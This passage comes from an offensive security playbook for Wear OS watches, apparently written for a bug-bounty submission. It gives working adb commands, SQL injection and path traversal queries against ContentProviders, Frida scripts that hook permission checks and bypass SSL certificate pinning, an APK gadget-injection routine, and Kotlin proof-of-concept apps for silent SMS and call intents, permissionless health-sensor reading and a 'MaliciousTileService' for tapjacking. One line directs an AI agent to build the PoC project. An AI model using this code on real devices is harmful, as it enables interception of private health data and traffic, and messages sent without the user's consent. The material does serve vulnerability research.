  1. Grant BODY_SENSORS to PoC app
  2. Register PassiveMonitoringClient listener
  3. Revoke BODY_SENSORS permission via Settings
  4. Check if listener STILL receives health data updates
  
  $ adb shell pm revoke <POC_PACKAGE> android.permission.BODY_SENSORS
  # Monitor logcat for continued health data delivery

Step 4 — Check broadcast receivers for health data
  $ adb shell dumpsys activity broadcasts | grep -i health
  # Look for implicit broadcasts that leak health data to any receiver

Step 5 — Inspect health data storage
  $ adb shell run-as com.google.android.apps.fitness ls /data/data/com.google.android.apps.fitness/
  $ adb shell content query --uri content://com.google.android.apps.fitness
```

### VECTOR 3: Wearable Data Layer Abuse (HIGH)

```
SEVERITY: HIGH
ATTACKER MODEL: A (Watch App), B (Phone App)
CWE: CWE-306 (Missing Authentication for Critical Function)

VALIDATION STEPS:

Step 1 — Find WearableListenerService handlers
  $ grep -rn "WearableListenerService" ./disassembled/*/AndroidManifest.xml
  $ grep -rn "onMessageReceived\|onDataChanged" ./decompiled/*/sources/ --include="*.java"

Step 2 — Enumerate Data Layer capabilities
  $ adb shell dumpsys activity service com.google.android.gms/.wearable.service.WearableService

Step 3 — Test message injection
  Build a PoC watch app that sends crafted MessageClient messages:
  - Use same message paths as legitimate apps
  - Test if phone-side handlers validate sender node ID
  - Check if sensitive data (auth tokens, health) is sent in plaintext over BLE

Step 4 — BLE traffic capture (if nRF dongle available)
  # Start Wireshark with nRF sniffer
  # Filter: btatt (BLE ATT protocol)
  # Look for: plaintext health data, auth tokens, notification content
```

### VECTOR 4: Tile/Complication UI Redressing (MEDIUM)

```
SEVERITY: MEDIUM
ATTACKER MODEL: D (Malicious Tile/Complication Provider)
CWE: CWE-451 (User Interface Misrepresentation of Critical Information)

VALIDATION STEPS:

Step 1 — Register malicious Complication provider
  Build PoC app that implements ComplicationProviderService
  Return spoofed data mimicking Google Fit / Health

Step 2 — Build tapjacking Tile
  Create a Tile that visually mimics:
  - Google Wallet payment confirmation
  - System unlock dialog
  - Permission grant dialog
  Test if user can be tricked into tapping on the small watch screen

Step 3 — Test Tile data access
  Check if TileService.onTileRequest can access:
  - Clipboard content
  - Notification data
  - Sensor readings
  WITHOUT declared permissions

Step 4 — Watch Face Format (WFF) XML injection
  $ grep -rn "XmlPullParser\|SAXParser\|DocumentBuilder" \
    ./decompiled/*/sources/ --include="*.java" | grep -i "watchface\|wff"
  # Test for XXE if WFF engine parses third-party XML
```

### VECTOR 5: Permission Model Gaps & Privilege Escalation (HIGH)

```
SEVERITY: HIGH
ATTACKER MODEL: A (Malicious Watch App)
CWE: CWE-269 (Improper Privilege Management)

VALIDATION STEPS:

Step 1 — Full permission audit
  $ adb shell dumpsys package | grep -A2 "declared permissions" > ./findings/all_declared_perms.txt
  $ adb shell dumpsys package | grep "grantedPermissions\|runtime permissions" > ./findings/granted_perms.txt

Step 2 — Test Wear-specific permissions
  # Check if these can be requested by third-party apps:
  $ adb shell pm grant <POC_PKG> com.google.android.wearable.permission.BIND_TILE_PROVIDER
  $ adb shell pm grant <POC_PKG> com.google.android.wearable.permission.BIND_COMPLICATION_PROVIDER

Step 3 — ContentProvider audit
  $ for provider in $(adb shell dumpsys package providers | grep -oP 'com\.\S+/\S+'); do
      echo "=== $provider ==="
      adb shell content query --uri "content://$provider/" 2>&1 | head -5
    done

Step 4 — Test ambient mode permission transitions
  # Put watch into ambient mode
  # Check if foreground app gains temporary capabilities
  $ adb shell dumpsys activity top  # in ambient mode
  $ adb shell dumpsys activity top  # in active mode
  # Compare granted permissions/capabilities

Step 5 — SQLi in ContentProviders
  $ adb shell content query --uri "content://<PROVIDER_AUTHORITY>/" \
    --where "1=1) UNION SELECT sql FROM sqlite_master--"
```

### VECTOR 6: Bluetooth/GATT Exploitation (HIGH)

```
SEVERITY: HIGH  
ATTACKER MODEL: C (Proximity BLE)
CWE: CWE-287 (Improper Authentication)

VALIDATION STEPS:

Step 1 — Enumerate GATT services
  # Using nRF Connect app on a second phone:
  # Scan → Connect to Pixel Watch
  # List all GATT services and characteristics
  # Flag: any characteristic with READ/WRITE without AUTH requirement

Step 2 — Test pairing security
  # Attempt pairing from a new device
  # Check if watch enforces:
  # - Passkey Entry (SECURE) vs Just Works (WEAK)
  # - Numeric Comparison
  # - LE Secure Connections vs Legacy Pairing

Step 3 — GATT write replay
  # Capture legitimate GATT writes with Wireshark
  # Replay them from a different device
  # Check if values are accepted (no sequence number / nonce)

Step 4 — BLE MITM test
  $ sudo btlejuice-proxy  # on nRF dongle
  # Intercept watch ↔ phone BLE traffic
  # Check for plaintext sensitive data
```

### VECTOR 7: Network/API Surface (MEDIUM)

```
SEVERITY: MEDIUM
ATTACKER MODEL: E (Network)
CWE: CWE-295 (Improper Certificate Validation)

VALIDATION STEPS:

Step 1 — Set up proxy
  # Configure watch Wi-Fi with manual proxy to Burp Suite
  # Install Burp CA cert on watch:
  $ adb push burp_cert.pem /sdcard/
  # Settings → Security → Install from storage

Step 2 — Capture and analyze API traffic
  # Monitor in Burp for:
  # - API endpoints returning more data than watch UI shows
  # - OAuth tokens with broader scopes than needed
  # - API keys or secrets in request headers

Step 3 — Test certificate pinning
  # Use Frida to bypass cert pinning:
  $ frida -U -l ssl_pinning_bypass.js -f <TARGET_PACKAGE>

Step 4 — Check OTA update mechanism
  $ adb shell dumpsys activity service UpdateService
  # Inspect: Is firmware signature verified? Can a crafted OTA be pushed?
```


---


# PART 4 — DYNAMIC ANALYSIS & RUNTIME INSTRUMENTATION

---

## 4.1 Frida Setup on Wear OS

### Install Frida Server on Watch

```bash
# ── Download correct Frida server for watch architecture ──
FRIDA_VERSION=$(frida --version)
ARCH=$(adb shell getprop ro.product.cpu.abi)  # Usually arm64-v8a for Pixel Watch
echo "Frida version: $FRIDA_VERSION, Watch arch: $ARCH"

# Download from: https://github.com/frida/frida/releases
# Example:
curl -L -o frida-server.xz \
  "https://github.com/frida/frida/releases/download/${FRIDA_VERSION}/frida-server-${FRIDA_VERSION}-android-arm64.xz"
xz -d frida-server.xz

# ── Push to watch ──
adb push frida-server /data/local/tmp/
adb shell chmod 755 /data/local/tmp/frida-server

# ── Start Frida server (needs root or debug build) ──
# Option A: If watch is rooted
adb shell su -c '/data/local/tmp/frida-server -D &'

# Option B: If not rooted, use frida-gadget injection
# (See section 4.2 for gadget approach)

# ── Verify Frida is running ──
frida-ps -U  # Should list watch processes
```

### Frida Gadget Injection (No Root Required)

```bash
# ── For non-rooted watches: inject frida-gadget into target APK ──

inject_gadget() {
  local APK=$1
  local OUTPUT_DIR="./gadget_injected"
  mkdir -p "$OUTPUT_DIR"
  
  # 1. Disassemble
  apktool d "$APK" -o "$OUTPUT_DIR/temp_disasm" -f
  
  # 2. Download frida-gadget
  GADGET_URL="https://github.com/frida/frida/releases/download/${FRIDA_VERSION}/frida-gadget-${FRIDA_VERSION}-android-arm64.so.xz"
  curl -L -o gadget.so.xz "$GADGET_URL"
  xz -d gadget.so.xz
  
  # 3. Inject gadget library
  mkdir -p "$OUTPUT_DIR/temp_disasm/lib/arm64-v8a/"
  cp gadget.so "$OUTPUT_DIR/temp_disasm/lib/arm64-v8a/libfrida-gadget.so"
  
  # 4. Add System.loadLibrary call to main activity smali
  # (Manual step — inject into the main activity's onCreate)
  
  # 5. Rebuild
  apktool b "$OUTPUT_DIR/temp_disasm" -o "$OUTPUT_DIR/target_gadget.apk"
  
  # 6. Sign
  keytool -genkey -v -keystore debug.keystore -alias debug -keyalg RSA \
    -keysize 2048 -validity 10000 -storepass android -keypass android \
    -dname "CN=Debug"
  apksigner sign --ks debug.keystore --ks-pass pass:android \
    "$OUTPUT_DIR/target_gadget.apk"
  
  # 7. Install on watch
  adb install -r "$OUTPUT_DIR/target_gadget.apk"
}
```

---

## 4.2 Frida Scripts for Wear OS Vulnerability Hunting

### Script 1: Intent Monitor — Catch All Intent Activity

```javascript
// ── intent_monitor.js ──
// Monitors all intent-based activity launches on the watch
// Use: frida -U -l intent_monitor.js -f <target_package>

Java.perform(function() {
    console.log("[*] Intent Monitor loaded — watching all startActivity calls");

    // Hook Activity.startActivity
    var Activity = Java.use("android.app.Activity");
    Activity.startActivity.overload("android.content.Intent").implementation = function(intent) {
        var action = intent.getAction();
        var data = intent.getData();
        var extras = intent.getExtras();
        var component = intent.getComponent();
        
        console.log("\n[INTENT] ==========================================");
        console.log("  Action:    " + action);
        console.log("  Data:      " + data);
        console.log("  Component: " + component);
        if (extras) {
            var keys = extras.keySet().iterator();
            while (keys.hasNext()) {
                var key = keys.next();
                console.log("  Extra:     " + key + " = " + extras.get(key));
            }
        }
        console.log("  Caller:    " + this.getClass().getName());
        console.log("[INTENT] ==========================================\n");
        
        // Check for sensitive actions WITHOUT confirmation
        if (action === "android.intent.action.SENDTO" || 
            action === "android.intent.action.CALL" ||
            action === "android.intent.action.SEND") {
            console.log("[!!!] SENSITIVE ACTION DETECTED — Check for confirmation dialog!");
        }
        
        return this.startActivity(intent);
    };
    
    // Hook Context.startActivity (catches service-launched intents)
    var Context = Java.use("android.content.Context");
    Context.startActivity.overload("android.content.Intent").implementation = function(intent) {
        console.log("[CONTEXT-INTENT] Action: " + intent.getAction() + 
                    " Data: " + intent.getData() +
                    " Caller: " + this.getClass().getName());
        return this.startActivity(intent);
    };
    
    // Hook startService
    var ContextWrapper = Java.use("android.content.ContextWrapper");
    ContextWrapper.startService.overload("android.content.Intent").implementation = function(intent) {
        console.log("[SERVICE] " + intent.getAction() + " → " + intent.getComponent());
        return this.startService(intent);
    };
    
    // Hook sendBroadcast
    ContextWrapper.sendBroadcast.overload("android.content.Intent").implementation = function(intent) {
        console.log("[BROADCAST] " + intent.getAction() + " Data: " + intent.getData());
        return this.sendBroadcast(intent);
    };
});
```

### Script 2: Health Services Data Interceptor

```javascript
// ── health_interceptor.js ──
// Intercepts Health Services API calls and data callbacks
// Use: frida -U -l health_interceptor.js -f com.google.android.apps.fitness

Java.perform(function() {
    console.log("[*] Health Services Interceptor loaded");
    
    // Hook HealthServicesClient
    try {
        var HealthServicesClient = Java.use("com.google.android.gms.fitness.HealthServicesClient");
        console.log("[+] HealthServicesClient found");
    } catch(e) {
        console.log("[-] HealthServicesClient not found, trying alternatives...");
    }
    
    // Hook PassiveMonitoringClient callbacks
    try {
        var PassiveListenerCallback = Java.use(
            "androidx.health.services.client.PassiveListenerCallback"
        );
        PassiveListenerCallback.onNewDataPointsReceived.implementation = function(dataPoints) {
            console.log("\n[HEALTH-DATA] ============================");
            console.log("  DataPoints received: " + dataPoints.toString());
            console.log("  Caller package: " + this.getClass().getName());
            console.log("[HEALTH-DATA] ============================\n");
            return this.onNewDataPointsReceived(dataPoints);
        };
    } catch(e) {
        console.log("[-] PassiveListenerCallback hook failed: " + e);
    }
    
    // Hook SensorManager for raw sensor access
    var SensorManager = Java.use("android.hardware.SensorManager");
    SensorManager.registerListener.overload(
        "android.hardware.SensorEventListener",
        "android.hardware.Sensor",
        "int"
    ).implementation = function(listener, sensor, rate) {
        console.log("[SENSOR] Registering: " + sensor.getName() + 
                    " Type: " + sensor.getType() +
                    " Rate: " + rate);
        return this.registerListener(listener, sensor, rate);
    };
    
    // Monitor permission checks
    var ContextCompat = Java.use("androidx.core.content.ContextCompat");
    ContextCompat.checkSelfPermission.implementation = function(context, permission) {
        var result = this.checkSelfPermission(context, permission);
        if (permission.indexOf("BODY_SENSORS") !== -1 || 
            permission.indexOf("ACTIVITY_RECOGNITION") !== -1) {
            console.log("[PERM-CHECK] " + permission + " → " + 
                        (result === 0 ? "GRANTED" : "DENIED"));
        }
        return result;
    };
});
```

### Script 3: Data Layer Bridge Monitor

```javascript
// ── datalayer_monitor.js ──
// Monitors Wearable Data Layer communications (watch ↔ phone)
// Use: frida -U -l datalayer_monitor.js -f com.google.android.gms

Java.perform(function() {
    console.log("[*] Data Layer Monitor loaded");
    
    // Hook MessageClient.sendMessage
    try {
        var MessageClient = Java.use("com.google.android.gms.wearable.MessageClient");
        // Hook via interface implementation patterns
    } catch(e) {}
    
    // Hook WearableListenerService.onMessageReceived
    try {
        Java.enumerateLoadedClasses({
            onMatch: function(className) {
                if (className.indexOf("WearableListenerService") !== -1) {
                    try {
                        var cls = Java.use(className);
                        cls.onMessageReceived.implementation = function(messageEvent) {
                            console.log("\n[DATA-LAYER-MSG] ========================");
                            console.log("  Path:     " + messageEvent.getPath());
                            console.log("  SourceID: " + messageEvent.getSourceNodeId());
                            var data = messageEvent.getData();
                            if (data) {
                                console.log("  Data:     " + bytesToString(data));
                                console.log("  DataHex:  " + bytesToHex(data));
                            }
                            console.log("  Handler:  " + className);
                            console.log("[DATA-LAYER-MSG] ========================\n");
                            return this.onMessageReceived(messageEvent);
                        };
                        console.log("[+] Hooked: " + className);
                    } catch(e) {}
                }
            },
            onComplete: function() {}
        });
    } catch(e) {
        console.log("[-] Data Layer hook failed: " + e);
    }
    
    function bytesToString(bytes) {
        try {
            var StringClass = Java.use("java.lang.String");
            return StringClass.$new(bytes, "UTF-8");
        } catch(e) { return "<binary>"; }
    }
    
    function bytesToHex(bytes) {
        var hex = "";
        for (var i = 0; i < Math.min(bytes.length, 64); i++) {
            hex += ("0" + (bytes[i] & 0xFF).toString(16)).slice(-2) + " ";
        }
        return hex + (bytes.length > 64 ? "..." : "");
    }
});
```

### Script 4: Permission Bypass Detector

```javascript
// ── permission_bypass.js ──
// Detects when apps access protected resources without proper permission checks
// Use: frida -U -l permission_bypass.js -f <target_package>

Java.perform(function() {
    console.log("[*] Permission Bypass Detector loaded");
    
    var findings = [];
    
    // Hook checkPermission/checkCallingPermission
    var Context = Java.use("android.content.Context");
    
    Context.checkPermission.overload("java.lang.String", "int", "int").implementation = function(perm, pid, uid) {
        var result = this.checkPermission(perm, pid, uid);
        console.log("[PERM] checkPermission(" + perm + ") → " + 
                    (result === 0 ? "GRANTED" : "DENIED") +
                    " pid=" + pid + " uid=" + uid);
        return result;
    };
    
    Context.checkCallingPermission.overload("java.lang.String").implementation = function(perm) {
        var result = this.checkCallingPermission(perm);
        if (result !== 0) {
            console.log("[!!!] DENIED calling permission: " + perm);
            findings.push({permission: perm, result: "DENIED", type: "calling"});
        }
        return result;
    };
    
    // Hook enforcePermission (throws SecurityException)
    Context.enforcePermission.overload("java.lang.String", "int", "int", "java.lang.String")
        .implementation = function(perm, pid, uid, message) {
        console.log("[ENFORCE] " + perm + " pid=" + pid + " uid=" + uid);
        try {
            return this.enforcePermission(perm, pid, uid, message);
        } catch(e) {
            console.log("[!!!] SecurityException for: " + perm);
            throw e;
        }
    };
    
    // Hook ContentResolver.query to detect unprotected provider access
    var ContentResolver = Java.use("android.content.ContentResolver");
    ContentResolver.query.overload(
        "android.net.Uri", "[Ljava.lang.String;",
        "java.lang.String", "[Ljava.lang.String;", "java.lang.String"
    ).implementation = function(uri, proj, sel, selArgs, sort) {
        console.log("[PROVIDER-QUERY] " + uri.toString());
        return this.query(uri, proj, sel, selArgs, sort);
    };
});
```

### Script 5: SSL Pinning Bypass for Wear OS

```javascript
// ── ssl_bypass_wear.js ──
// Bypasses SSL/TLS certificate pinning on Wear OS apps
// Use: frida -U -l ssl_bypass_wear.js -f <target_package>

Java.perform(function() {
    console.log("[*] SSL Pinning Bypass for Wear OS loaded");
    
    // TrustManager bypass
    var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    var SSLContext = Java.use("javax.net.ssl.SSLContext");
    var TrustManager = Java.registerClass({
        name: "com.bypass.TrustManager",
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    
    var TrustManagers = [TrustManager.$new()];
    var sslCtx = SSLContext.getInstance("TLS");
    sslCtx.init(null, TrustManagers, null);
    SSLContext.getInstance.overload("java.lang.String").implementation = function(type) {
        var ctx = this.getInstance(type);
        ctx.init(null, TrustManagers, null);
        return ctx;
    };
    
    // OkHttp CertificatePinner bypass
    try {
        var CertificatePinner = Java.use("okhttp3.CertificatePinner");
        CertificatePinner.check.overload("java.lang.String", "java.util.List")
            .implementation = function(hostname, peerCerts) {
            console.log("[SSL-BYPASS] Bypassed pin for: " + hostname);
        };
    } catch(e) {}
    
    // Network security config bypass
    try {
        var NetworkSecurityConfig = Java.use(
            "android.security.net.config.NetworkSecurityConfig"
        );
        NetworkSecurityConfig.isCleartextTrafficPermitted.implementation = function() {
            return true;
        };
    } catch(e) {}
    
    console.log("[+] SSL pinning bypassed");
});
```

---

## 4.3 ADB Dynamic Testing Commands

### Intent Fuzzing via ADB

```bash
#!/bin/bash
# ── intent_fuzz.sh ──
# Fuzzes exported components with various intent configurations

TARGET_PKG=$1
RESULTS_DIR="./findings/dynamic/${TARGET_PKG}"
mkdir -p "$RESULTS_DIR"

echo "=== Intent Fuzzing: $TARGET_PKG ===" > "$RESULTS_DIR/fuzz_log.txt"

# ── Get all exported activities ──
ACTIVITIES=$(adb shell dumpsys package "$TARGET_PKG" | \
  grep -A1 "exported=true" | grep "Activity" | awk '{print $NF}')

for activity in $ACTIVITIES; do
  echo "[TEST] $activity" | tee -a "$RESULTS_DIR/fuzz_log.txt"
  
  # Test 1: Basic launch
  adb shell am start -n "$TARGET_PKG/$activity" 2>&1 | tee -a "$RESULTS_DIR/fuzz_log.txt"
  sleep 1
  
  # Test 2: With SMS URI
  adb shell am start -n "$TARGET_PKG/$activity" \
    -a android.intent.action.SENDTO -d "smsto:+0000000000" \
    --es sms_body "FUZZ_TEST" 2>&1 | tee -a "$RESULTS_DIR/fuzz_log.txt"
  sleep 1
  
  # Test 3: With tel: URI
  adb shell am start -n "$TARGET_PKG/$activity" \
    -a android.intent.action.VIEW -d "tel:+0000000000" 2>&1 | tee -a "$RESULTS_DIR/fuzz_log.txt"
  sleep 1
  
  # Test 4: With file:// URI (path traversal)
  adb shell am start -n "$TARGET_PKG/$activity" \
    -a android.intent.action.VIEW \
    -d "file:///data/data/$TARGET_PKG/databases/" 2>&1 | tee -a "$RESULTS_DIR/fuzz_log.txt"
  sleep 1
  
  # Test 5: With content:// URI
  adb shell am start -n "$TARGET_PKG/$activity" \
    -a android.intent.action.VIEW \
    -d "content://$TARGET_PKG.provider/" 2>&1 | tee -a "$RESULTS_DIR/fuzz_log.txt"
  sleep 1
  
  # Capture screenshot after each test
  adb shell screencap -p /sdcard/screen.png
  adb pull /sdcard/screen.png "$RESULTS_DIR/${activity}_screenshot.png" 2>/dev/null
done

# ── Test broadcast receivers ──
RECEIVERS=$(adb shell dumpsys package "$TARGET_PKG" | \
  grep -A1 "exported=true" | grep "Receiver" | awk '{print $NF}')

for receiver in $RECEIVERS; do
  echo "[BROADCAST-TEST] $receiver" | tee -a "$RESULTS_DIR/fuzz_log.txt"
  adb shell am broadcast -n "$TARGET_PKG/$receiver" \
    -a "android.intent.action.BOOT_COMPLETED" 2>&1 | tee -a "$RESULTS_DIR/fuzz_log.txt"
done

echo "=== Fuzzing Complete ===" | tee -a "$RESULTS_DIR/fuzz_log.txt"
```

### ContentProvider Exploitation

```bash
#!/bin/bash
# ── provider_audit.sh ──
# Tests all accessible ContentProviders for data leaks and injection

TARGET_PKG=$1
RESULTS_DIR="./findings/dynamic/providers"
mkdir -p "$RESULTS_DIR"

# ── Get provider authorities ──
PROVIDERS=$(adb shell dumpsys package "$TARGET_PKG" | \
  grep "Provider{" | grep -oP 'authority=\K\S+' | tr -d '}')

for authority in $PROVIDERS; do
  echo "=== Testing: content://$authority ===" | tee -a "$RESULTS_DIR/provider_audit.txt"
  
  # Test 1: Basic query
  adb shell content query --uri "content://$authority/" \
    2>&1 | head -20 | tee -a "$RESULTS_DIR/provider_audit.txt"
  
  # Test 2: Path traversal
  adb shell content query --uri "content://$authority/../../etc/passwd" \
    2>&1 | tee -a "$RESULTS_DIR/provider_audit.txt"
  
  # Test 3: SQL injection in selection
  adb shell content query --uri "content://$authority/" \
    --where "'1'='1'" 2>&1 | tee -a "$RESULTS_DIR/provider_audit.txt"
  
  # Test 4: Read file via openFile
  adb shell content read --uri "content://$authority/test" \
    2>&1 | tee -a "$RESULTS_DIR/provider_audit.txt"
  
  echo "" >> "$RESULTS_DIR/provider_audit.txt"
done
```

### Logcat Monitoring During Tests

```bash
# ── Start logcat capture during dynamic testing ──
LOG_DIR="./findings/dynamic/logs"
mkdir -p "$LOG_DIR"

# Capture all security-relevant logs
adb logcat -c  # Clear existing logs
adb logcat -v time \
  | grep -iE "permission|denied|security|exception|intent|broadcast|sensor|health" \
  > "$LOG_DIR/security_logcat.txt" &
LOGCAT_PID=$!

echo "Logcat monitoring started (PID: $LOGCAT_PID)"
echo "Run your tests now. Press Ctrl+C to stop."

# When done testing:
# kill $LOGCAT_PID
```

### Screen Recording During Validation

```bash
# ── Record the watch screen during PoC execution ──
# This is CRITICAL for the Google MVRP report

# Start recording (max 3 minutes on Wear OS)
adb shell screenrecord /sdcard/poc_demo.mp4 --time-limit 180 &
RECORD_PID=$!

echo "Recording started. Execute your PoC now."
echo "Recording will stop after 180 seconds or press Ctrl+C"

# Pull recording when done
# kill $RECORD_PID
# adb pull /sdcard/poc_demo.mp4 ./findings/poc_demo.mp4
```


---


# PART 5 — PoC APK CREATION, IMPACT MEASUREMENT & REPORTING

---

## 5.1 PoC APK Templates

### Template A: Intent Abuse PoC (CVE-2025-12080 Pattern)

```
AGENT_INSTRUCTION: Create an Android Studio project with these files.
This PoC demonstrates silent intent execution on Wear OS.
Replace <TARGET_ACTION> and <TARGET_URI> with the discovered vulnerability.
```

#### AndroidManifest.xml
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.poc.wearos.intentabuse">

    <!-- NOTE: No special permissions required — that's the vulnerability -->
    <uses-feature android:name="android.hardware.type.watch" />

    <application
        android:allowBackup="false"
        android:label="PoC Intent Abuse"
        android:supportsRtl="true"
        android:theme="@android:style/Theme.DeviceDefault">
        
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

#### MainActivity.kt
```kotlin
package com.poc.wearos.intentabuse

import android.app.Activity
import android.content.ActivityNotFoundException
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView

/**
 * PoC: Demonstrates silent message/call/action execution on Wear OS
 * without any permissions and without user confirmation.
 *
 * USAGE: Replace PHONE_NUMBER with a test number YOU control.
 * DO NOT use this against targets you do not own.
 */
class MainActivity : Activity() {

    companion object {
        private const val TAG = "WearOS-PoC"
        // REPLACE with your own test number
        private const val PHONE_NUMBER = "" // Leave empty for safety
        private const val TEST_MESSAGE = "PoC: Silent message sent without user confirmation"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(16, 16, 16, 16)
        }

        val status = TextView(this).apply {
            text = "Wear OS Intent Abuse PoC\n\nTap a button to test."
            textSize = 12f
        }
        layout.addView(status)

        // ── Test 1: SMS via smsto: ──
        layout.addView(createButton("Test SMS (smsto:)") {
            testIntent(
                Intent(Intent.ACTION_SENDTO).apply {
                    data = Uri.parse("smsto:$PHONE_NUMBER")
                    putExtra("sms_body", TEST_MESSAGE)
                },
                "SMS-SENDTO", status
            )
        })

        // ── Test 2: SMS via sms: ──
        layout.addView(createButton("Test SMS (sms:)") {
            testIntent(
                Intent(Intent.ACTION_SENDTO).apply {
                    data = Uri.parse("sms:$PHONE_NUMBER")
                    putExtra("sms_body", TEST_MESSAGE)
                },
                "SMS-SEND", status
            )
        })

        // ── Test 3: MMS ──
        layout.addView(createButton("Test MMS (mmsto:)") {
            testIntent(
                Intent(Intent.ACTION_SENDTO).apply {
                    data = Uri.parse("mmsto:$PHONE_NUMBER")
                    putExtra("sms_body", TEST_MESSAGE)
                },
                "MMS-SENDTO", status
            )
        })

        // ── Test 4: Phone call ──
        layout.addView(createButton("Test CALL (tel:)") {
            testIntent(
                Intent(Intent.ACTION_CALL).apply {
                    data = Uri.parse("tel:$PHONE_NUMBER")
                },
                "CALL", status
            )
        })

        // ── Test 5: Auto-trigger on launch ──
        if (PHONE_NUMBER.isNotEmpty()) {
            Log.w(TAG, "Auto-triggering SMS PoC on launch")
            testIntent(
                Intent(Intent.ACTION_SENDTO).apply {
                    data = Uri.parse("smsto:$PHONE_NUMBER")
                    putExtra("sms_body", "[AUTO] $TEST_MESSAGE")
                },
                "AUTO-SMS", status
            )
        }

        setContentView(layout)
    }

    private fun testIntent(intent: Intent, label: String, status: TextView) {
        try {
            Log.i(TAG, "[$label] Launching intent: ${intent.action} → ${intent.data}")
            startActivity(intent)
            status.text = "[$label] Intent launched!\nCheck if action executed without confirmation."
            Log.i(TAG, "[$label] SUCCESS — Intent launched without exception")
        } catch (e: ActivityNotFoundException) {
            status.text = "[$label] No handler found"
            Log.e(TAG, "[$label] ActivityNotFoundException: ${e.message}")
        } catch (e: SecurityException) {
            status.text = "[$label] Permission denied: ${e.message}"
            Log.e(TAG, "[$label] SecurityException: ${e.message}")
        }
    }

    private fun createButton(text: String, onClick: () -> Unit): Button {
        return Button(this).apply {
            this.text = text
            textSize = 10f
            setOnClickListener { onClick() }
        }
    }
}
```

#### build.gradle.kts (Module level)
```kotlin
plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}

android {
    namespace = "com.poc.wearos.intentabuse"
    compileSdk = 34

    defaultConfig {
        applicationId = "com.poc.wearos.intentabuse"
        minSdk = 30      // Wear OS 3+
        targetSdk = 34
        versionCode = 1
        versionName = "1.0-poc"
    }

    buildTypes {
        release {
            isMinifyEnabled = false
        }
    }
}

dependencies {
    // Minimal — no third-party SDKs (per Google MVRP requirements)
    implementation("androidx.wear:wear:1.3.0")
}
```

### Template B: Health Data Exfiltration PoC

```kotlin
package com.poc.wearos.healthleak

import android.app.Activity
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import android.os.Bundle
import android.util.Log
import android.widget.TextView

/**
 * PoC: Attempts to read health sensor data without BODY_SENSORS permission.
 * Tests whether the Health Services permission model is properly enforced.
 */
class HealthLeakActivity : Activity(), SensorEventListener {

    companion object {
        private const val TAG = "WearOS-HealthPoC"
    }

    private lateinit var sensorManager: SensorManager
    private var statusView: TextView? = null
    private val readings = mutableListOf<String>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        statusView = TextView(this).apply {
            text = "Health Sensor PoC\nAttempting sensor access..."
            textSize = 11f
            setPadding(16, 16, 16, 16)
        }
        setContentView(statusView)

        sensorManager = getSystemService(SENSOR_SERVICE) as SensorManager

        // List all available sensors
        val sensors = sensorManager.getSensorList(Sensor.TYPE_ALL)
        Log.i(TAG, "=== Available Sensors (${sensors.size}) ===")
        sensors.forEach { sensor ->
            Log.i(TAG, "  ${sensor.name} (Type: ${sensor.type}, Vendor: ${sensor.vendor})")
        }

        // Attempt to register for health-related sensors WITHOUT permission
        val healthSensorTypes = listOf(
            Sensor.TYPE_HEART_RATE,                    // 21
            Sensor.TYPE_HEART_BEAT,                    // 31
            65538,  // SpO2 (vendor-specific)
            65539,  // Skin temperature (vendor-specific)
            Sensor.TYPE_STEP_COUNTER,                  // 19
            Sensor.TYPE_STEP_DETECTOR,                 // 18
        )

        for (sensorType in healthSensorTypes) {
            val sensor = sensorManager.getDefaultSensor(sensorType)
            if (sensor != null) {
                val registered = sensorManager.registerListener(
                    this, sensor, SensorManager.SENSOR_DELAY_NORMAL
                )
                Log.i(TAG, "[${if (registered) "OK" else "FAIL"}] Registered for: ${sensor.name}")
                if (registered) {
                    readings.add("[REGISTERED] ${sensor.name} — NO permission check!")
                }
            } else {
                Log.i(TAG, "[SKIP] Sensor type $sensorType not available")
            }
        }
    }

    override fun onSensorChanged(event: SensorEvent?) {
        event?.let {
            val reading = "Sensor: ${it.sensor.name} Value: ${it.values.joinToString()}"
            Log.w(TAG, "[DATA-LEAK] $reading")
            readings.add(reading)
            statusView?.text = "DATA RECEIVED!\n\n${readings.takeLast(5).joinToString("\n")}"
        }
    }

    override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}

    override fun onDestroy() {
        super.onDestroy()
        sensorManager.unregisterListener(this)
    }
}
```

### Template C: Tile-Based Silent Action PoC

```kotlin
package com.poc.wearos.tilepoc

import android.content.Intent
import android.net.Uri
import android.util.Log
import androidx.wear.protolayout.*
import androidx.wear.protolayout.ActionBuilders.*
import androidx.wear.protolayout.LayoutElementBuilders.*
import androidx.wear.protolayout.ResourceBuilders.*
import androidx.wear.tiles.*
import com.google.common.util.concurrent.ListenableFuture
import com.google.common.util.concurrent.Futures

/**
 * PoC: Demonstrates that a Tile can launch privileged intents
 * without an Activity confirmation flow.
 *
 * Tiles run in a separate process — no Activity lifecycle means
 * the standard Android confirmation UX patterns cannot be applied.
 */
class MaliciousTileService : TileService() {

    companion object {
        private const val TAG = "WearOS-TilePoC"
        private const val RESOURCES_VERSION = "1"
    }

    override fun onTileRequest(requestParams: RequestBuilders.TileRequest): ListenableFuture<TileBuilders.Tile> {
        Log.i(TAG, "Tile requested — preparing malicious layout")
        
        val tile = TileBuilders.Tile.Builder()
            .setResourcesVersion(RESOURCES_VERSION)
            .setTileTimeline(
                TimelineBuilders.Timeline.Builder()
                    .addTimelineEntry(
                        TimelineBuilders.TimelineEntry.Builder()
                            .setLayout(
                                LayoutElementBuilders.Layout.Builder()
                                    .setRoot(buildClickableLayout())
                                    .build()
                            )
                            .build()
                    )
                    .build()
            )
            .build()
        
        return Futures.immediateFuture(tile)
